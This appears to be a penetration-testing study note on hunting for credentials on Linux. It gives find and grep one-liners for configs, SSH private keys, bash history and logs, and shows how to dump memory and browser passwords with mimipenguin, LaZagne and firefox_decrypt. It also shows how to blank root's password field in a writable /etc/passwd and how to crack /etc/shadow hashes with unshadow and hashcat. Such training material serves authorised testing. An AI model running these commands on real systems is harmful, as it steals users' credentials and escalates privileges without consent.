## Credential Hunting

Several sources that can provide us with credentials include:

|**`Files`**|**`History`**|**`Memory`**|**`Key-Rings`**|
|---|---|---|---|
|Configs|Logs|Cache|Browser stored credentials|
|Databases|Command-line History|In-memory Processing||
|Notes||||
|Scripts||||
|Source codes||||
|Cronjobs||||
|SSH Keys|

We would adapt our approach to the circumstances of the environment, it is crucial to keep in mind how the system works, it's focus, what purpose it exists for, and what role it plays in the business logic and the overall network.

## Files

Categories of files to look for:

| | | |
|---|---|---|
|Configuration files|Databases|Notes|
|Scripts|Cronjobs|SSH keys|

Configuration files are the core functionality of services and may include credentials, it also tells us how a service works. The configuration files are marked with the following 3 file extensions `.config`, `.conf`, `.cnf`, it's possible to change the file name but not common.

### Configuration Files
```shell-session
$ for l in $(echo ".conf .config .cnf");do echo -e "\nFile extension: " $l; find / -name *$l 2>/dev/null | grep -v "lib\|fonts\|share\|core" ;done
```

### Credentials in Configuration Files
```shell-session
$ for i in $(find / -name *.cnf 2>/dev/null | grep -v "doc\|lib");do echo -e "\nFile: " $i; grep "user\|password\|pass" $i 2>/dev/null | grep -v "\#";done
```

### Databases
```shell-session
$ for l in $(echo ".sql .db .*db .db*");do echo -e "\nDB File extension: " $l; find / -name *$l 2>/dev/null | grep -v "doc\|lib\|headers\|share\|man";done
```

### Notes

Notes can be kept on the system for specific processes, for example a list of access points and their credentials. They can be named anything and doesn't have to have `.txt` extension or any extension at all.

```shell-session
$ find /home/* -type f -name "*.txt" -o ! -name "*.*"
```

### Scripts
```shell-session
$ for l in $(echo ".py .pyc .pl .go .jar .c .sh");do echo -e "\nFile extension: " $l; find / -name *$l 2>/dev/null | grep -v "doc\|lib\|headers\|share";done
```

### Cronjobs

Cronjobs are divided into the system wide area (`/etc/crontab`) and user dependent executions. There are the areas that are divided into different time ranges `/etc/cron.daily`, `/etc/cron.hourly`, `/etc/cron.monthly`, `/etc/cron.weekly`). The scripts and files used by `cron` can also be found in `/etc/cron.d/` for Debian-based distributions.

```shell-session
$ cat /etc/crontab 
```
```shell-session
$ ls -la /etc/cron.*/
```

### SSH Keys

#### SSH Private Keys
```shell-session
$ grep -rnw "PRIVATE KEY" /home/* 2>/dev/null | grep ":1"
```

#### SSH Public Keys
```shell-session
$ grep -rnw "ssh-rsa" /home/* 2>/dev/null | grep ":1"
```

## History

#### Bash History

We can find the history of commands in distributions that use bash as a standard shell in `.bash_history`, other files like `.bashrc` or `.bash_profile` can contain important information.
```shell-session
$ tail -n5 /home/*/.bash*
```

#### Logs

Logs are stored in text files, with them we find system errors, detect problems regarding services, or follow what the system is doing in the background, there are 4 categories for log files:

|**Application Logs**|**Event Logs**|**Service Logs**|**System Logs**|
|---|---|---|---|

Some of the most important log files:

| **Log File**          | **Description**                                    |
| --------------------- | -------------------------------------------------- |
| `/var/log/messages`   | Generic system activity logs.                      |
| `/var/log/syslog`     | Generic system activity logs.                      |
| `/var/log/auth.log`   | (Debian) All authentication related logs.          |
| `/var/log/secure`     | (RedHat/CentOS) All authentication related logs.   |
| `/var/log/boot.log`   | Booting information.                               |
| `/var/log/dmesg`      | Hardware and drivers related information and logs. |
| `/var/log/kern.log`   | Kernel related warnings, errors and logs.          |
| `/var/log/faillog`    | Failed login attempts.                             |
| `/var/log/cron`       | Information related to cron jobs.                  |
| `/var/log/mail.log`   | All mail server related logs.                      |
| `/var/log/httpd`      | All Apache related logs.                           |
| `/var/log/mysqld.log` | All MySQL server related logs.                     |

Strings to find interesting contents in log files:
```shell-session
$ for i in $(ls /var/log/* 2>/dev/null);do GREP=$(grep "accepted\|session opened\|session closed\|failure\|failed\|ssh\|password changed\|new user\|delete user\|sudo\|COMMAND\=\|logs" $i 2>/dev/null); if [[ $GREP ]];then echo -e "\n#### Log file: " $i; grep "accepted\|session opened\|session closed\|failure\|failed\|ssh\|password changed\|new user\|delete user\|sudo\|COMMAND\=\|logs" $i 2>/dev/null;fi;done
```

## Memory and Cache

Many applications and processes store credentials in memory or files to be reused, for example the system required credentials for the logged in users. Another example is browsers. [mimipenguin](https://github.com/huntergregal/mimipenguin) makes the process of retrieving credentials from those places easier, it requires administrator/root permissions.

### Memory - Mimipenguin
```shell-session
$ sudo python3 mimipenguin.py
```
```shell-session
$ sudo bash mimipenguin.sh 
```

`LaZagne` is an even more powerful tool to extract credentials, some of the sources for passwords and hashes are:

|                |                |           |             |
| -------------- | -------------- | --------- | ----------- |
| Wifi           | Wpa_supplicant | Libsecret | Kwallet     |
| Chromium-based | CLI            | Mozilla   | Thunderbird |
| Git            | Env_variable   | Grub      | Fstab       |
| AWS            | Filezilla      | Gftp      | SSH         |
| Apache         | Shadow         | Docker    | KeePass     |
| Mimipy         | Sessions       | Keyrings  |             |

#### Memory - LaZagne
```shell-session
$ sudo python3 laZagne.py all
```

### Browsers

Browsers store the passwords in an encrypted form, for example Firefox stores them in encrypted form in a hidden folder, often it includes associated field names, URLs, and other valuable information. For example they can be stored encrypted in `logins.json`.

### Firefox Stored Credentials
```shell-session
$ ls -l .mozilla/firefox/ | grep default 

drwx------ 11 cry0l1t3 cry0l1t3 4096 Jan 28 16:02 1bplpd86.default-release
drwx------  2 cry0l1t3 cry0l1t3 4096 Jan 28 13:30 lfx3lvhb.default
```
```shell-session
$ cat .mozilla/firefox/1bplpd86.default-release/logins.json | jq .
```

[Firefox Decrypt](https://github.com/unode/firefox_decrypt) is excellent for decrypting the credentials.

### Decrypting Firefox Credentials
```shell-session
$ python3.9 firefox_decrypt.py
```

Alternatively, `LaZagne` can also return results if the user has used the supported browser.

### Browsers - LaZagne
```shell-session
$ python3 laZagne.py browsers
```

## Passwd, Shadow & Opasswd

One of the most used and standard authentication mechanism for Linux based distributions is [Pluggable Authentication Modules](https://web.archive.org/web/20220622215926/http://www.linux-pam.org/Linux-PAM-html/Linux-PAM_SAG.html) (`PAM`), it uses the modules `pam_unix.so` or `pam_unix2.so` and are located in `/usr/lib/x86_x64-linux-gnu/security/` in Debian based distributions. Those modules manage user information, authentication, sessions, current passwords and old passwords, for example PAM is called when we want to change our password with `passwd`, which takes the appropriate precautions and stores and handles the information accordingly.

The `pam_unix.so` standard module for management uses standardized API calls from the system libraries and files to update the account information. The standard files that are read, managed, and updated are `/etc/passwd` and `/etc/shadow`. PAM also has many other service modules, such as LDAP, mount, or Kerberos.

### Passwd

#### Passwd Format
| `cry0l1t3` | `:` | `x`           | `:` | `1000` | `:` | `1000` | `:` | `cry0l1t3,,,`      | `:` | `/home/cry0l1t3` | `:` | `/bin/bash` |
| ---------- | --- | ------------- | --- | ------ | --- | ------ | --- | ------------------ | --- | ---------------- | --- | ----------- |
| Login name |     | Password info |     | UID    |     | GUID   |     | Full name/comments |     | Home directory   |     | Shell       |

In rare cases if it's an old system we might find the hash of the encrypted password in the password info field, modern systems store hashes in the `/etc/shadow` file.

`x` in the password info field means the password is stored in an encrypted form in `/etc/shadow`, if the `/etc/passwd` file is writable by mistake, we can clear this field for the user `root` so it will be empty, which will cause the system to not send a password prompt when a user tries to log in as root.

#### Root Without password
```shell-session
[cry0l1t3@parrot]─[~]$ head -n 1 /etc/passwd

root::0:0:root:/root:/bin/bash


[cry0l1t3@parrot]─[~]$ su

[root@parrot]─[/home/cry0l1t3]#
```

### Shadow File

The `/etc/shadow` file stores all the password information of users, if a user has an entry in `/etc/passwd` but not in `/etc/shadow` the user is considered invalid. The `/etc/shadow` file is only readable by users with administrative rights.

#### Shadow Format
|`cry0l1t3`|`:`|`$6$wBRzy$...SNIP...x9cDWUxW1`|`:`|`18937`|`:`|`0`|`:`|`99999`|`:`|`7`|`:`|`:`|`:`|
|---|---|---|---|---|---|---|---|---|---|---|---|---|---|
|Username||Encrypted password||Last PW change||Min. PW age||Max. PW age||Warning period|Inactivity period|Expiration date|Unused|

If there is `!` or `*` in the password field, the user cannot login with a Unix password, other authentication methods such as Kerberos or key-based authentication can be used, the same applies if the password field is empty. However it can lead to specific programs denying access to functions.

Encrypted password format:
`$<type>$<salt>$<hashed>`

#### Algorithm Types
- `$1$` – MD5
- `$2a$` – Blowfish
- `$2y$` – Eksblowfish
- `$5$` – SHA-256
- `$6$` – SHA-512

By default the SHA-512 (`$6$`) encryption method is used on the latest Linux distributions.

### Opasswd

The PAM library (`pam_unix.so`) can prevent reusing old passwords. The file where old passwords are stored is the `/etc/security/opasswd`. Administrator/root permissions are also required to read the file if the permissions for this file have not been changed manually.

We can find password patterns that can be used to crack the current password, and maybe password with an older used hash.

### Cracking Linux Credentials

#### Unshadow
```shell-session
$ sudo cp /etc/passwd /tmp/passwd.bak 
$ sudo cp /etc/shadow /tmp/shadow.bak 
$ unshadow /tmp/passwd.bak /tmp/shadow.bak > /tmp/unshadowed.hashes
```

#### Hashcat - Cracking Unshadowed Hashes
```shell-session
$ hashcat -m 1800 -a 0 /tmp/unshadowed.hashes rockyou.txt -o /tmp/unshadowed.cracked
```

#### Hashcat - Cracking MD5 Hashes
```shell-session
$ hashcat -m 500 -a 0 md5-hashes.list rockyou.txt
```

